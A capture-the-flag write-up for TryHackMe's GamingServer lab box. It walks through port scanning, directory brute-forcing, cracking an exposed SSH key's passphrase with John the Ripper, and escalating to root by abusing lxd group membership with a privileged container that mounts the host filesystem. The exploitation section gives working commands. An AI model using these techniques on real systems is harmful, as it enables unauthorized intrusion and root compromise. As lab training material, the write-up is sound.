---
description: https://tryhackme.com/room/gamingserver
---

# GamingServer

## Nmap Scan

```
nmap 10.10.162.73 -A -T4 -p- 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## DirBuster

With only port 22 and 80 open lets take a look at port 80. Before going to the webpage lets run `DirBuster` as this will take some time. As this is an Apache server I have defined the extensions: php,bin and txt.

![Running DirBuster](<../../../.gitbook/assets/image (31) (1) (1).png>)

If we head over to the about page at: [http://10.10.162.73/about.html](http://10.10.162.73/about.html) we can seen an uploads button which takes us to: [http://10.10.162.73/uploads](http://10.10.162.73/uploads/). The uploads directory has also been defined as disallowed in robots.txt

![](<../../../.gitbook/assets/image (32) (1) (1).png>)

The uploads directory:

![/uploads/](<../../../.gitbook/assets/image (33) (1) (1).png>)

the dict.lst file appears to be a list of password and possibly even usernames. After a quick look at the file I added a few of my own lines. Some of the entries in this file are ones such as Summer2017 and winter2016. I created these again going from 2018-2020 using all seasons of the year and added entries with the first letter capitalized and uncapitalized.

The character in the meme.jpg file is Beaker from the Muppets so I added the name to the password file and may even use it as a username going forwards.

The manifesto does not contain much interesting information but does have an author name in it which we can use as a possible name. The manifesto could possibly mean the server has already been compromised? I added the author name to the password file just incase.

![](<../../../.gitbook/assets/image (34) (1) (1).png>)

At this point I check DirBuster to see what we have so far and we see some interesting entries for "secret".

![Checking DirBuster](<../../../.gitbook/assets/image (35) (1) (1).png>)

We browse to the secret directory and find a RSA key. Lets copy this to our local machine.

the two lines at the top indicate this file will likely require a passphrase when we try and connect to SSH. It is important to note that at this point we do not have a confirmed username.

![RSA key in the secret directory](<../../../.gitbook/assets/image (37) (1) (1).png>)

## John The Ripper

We can run the following command to convert the SSH key into a hash file for John to crack.

```
sudo python ssh2john.py /home/kali/Desktop/id_rsa > /home/kali/Desktop/key
```

{% hint style="info" %}
If the location of ssh2john.py is not defined in `$PATH` you will have to `cd` to its home directory which you can find by doing `locate ssh2john.py`
{% endhint %}

After the key has been converted to a hash file we can run john against the file using the dict.txt list we saved from the uploads directory earlier.

![](../../../.gitbook/assets/password.png)

Looks like the password has been found.

## Finding user

I actually got stuck on username enumeration for a good half hour or so and was running out of ideas. I found the answer when I was reading through the description of the box where it mentions "Can you gain access to this gaming server built by \*\*amateurs \*\*with no experience of web development and take advantage of the deployment system."

When I read the line regarding amateurs I decided to try the basics and looked at the page source for the root page.

![Checking the page source on root directory](<../../../.gitbook/assets/image (40) (1).png>)

I then tried the following using `ssh -i` to define the key to use. I entered the password and was able to access as user.

![SSH access](<../../../.gitbook/assets/image (41) (1).png>)

From here we can Grab the user.txt flag which is located in the current directory where we logged in:

![hash has been removed from image](<../../../.gitbook/assets/image (42) (1).png>)

## Privilege Escalation

First of all I tried `sudo -l` this was asking for a password unfortunately. I tried the "letmein" password and this did not work which means the SSH passphrase is different from the one used for the local account.

Lets see if Linpeas can help us here. Created a Python HTTPServer in the directory hosting Linpeas:

![](<../../../.gitbook/assets/image (43) (1).png>)

Download the script onto the victim machine:

![](<../../../.gitbook/assets/image (44) (1) (1).png>)

Run the script and pipe it to `tee` for easier viewing as Linpeas usually exceeds the terminal buffer.

![](<../../../.gitbook/assets/image (45) (1).png>)

I went through the results and found the following:

![](<../../../.gitbook/assets/image (46) (1).png>)

Normally sudo would be a interesting find but, seeing as we do not have the users local account password we are unable to do anything with it. Linpeas has picked up the group "lxd" as interesting and is not a group I have come across before.

I started researching this group and the first auto suggestion by Google essentially pushed me in the right direction.

![](<../../../.gitbook/assets/image (47) (1).png>)

I went to one of the front page articles and found a great one which breaks down the escalation technique and explains what LXD is: [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

"LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

One of them is to use the LXD API to mount the host’s root filesystem into a container. This gives a low-privilege user root access to the host filesystem."

## Exploitation

Run the following command on the attacking machine:

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

This will create a file called "alpine-v3.12-x86\_64-20200831\_1823.tar.gz" the version number will change as the package gets updated. At the time of writing the version above is the latest.

Fire up the Python HTTP Server again with `python -m SimpleHTTPServer` in the directory where alpine is stored.

`cd` to the `/tmp/` directory and use `wget` to download the file.

![](<../../../.gitbook/assets/image (48) (1).png>)

After this run the following command to import the image:

```
lxc image import ./alpine-v3.12-x86_64-20200831_1823.tar.gz --alias myimage
```

Now that the image has been imported run the following commands to obtain a root shell in the image mount point:

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![](<../../../.gitbook/assets/image (49) (1).png>)

As we are inside a container we need to cd over to /mnt/root to see the local machine files. use the following command `cd /mnt/root/root`

![Grabbing root](<../../../.gitbook/assets/image (54) (1).png>)

From here we can grab the root flag and submit it.
